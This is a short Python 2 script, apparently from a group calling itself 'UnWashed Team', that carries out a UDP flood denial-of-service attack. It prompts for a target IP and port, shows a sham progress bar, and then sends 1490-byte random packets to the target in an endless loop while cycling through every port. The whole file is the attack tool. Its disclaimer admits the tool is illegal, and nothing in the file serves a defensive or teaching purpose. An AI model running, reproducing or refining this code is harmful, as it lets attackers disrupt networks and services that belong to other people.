print ("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet UnWashed Team")
print
print "Yapımcı : YeazyyTheGreat"
print "Team   : UnWashed Team"
print "Github   : github.com/Yeazyyv2"
print "Discord   : https://discord.com/invite/XyTeBfYV5U"
print "Discord sunucumuza katılarak yeni şeyler öğrenebilirsin <3 "
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
print
ip = raw_input("Hedef IP : ")
port = input("Port       : ")
os.system("clear")
print("\033[93m")
os.system("figlet DDoSAttack")
print("Team : UnWashed Team")
print ("\033[92m")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "%s paket %s adresine gitti! port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

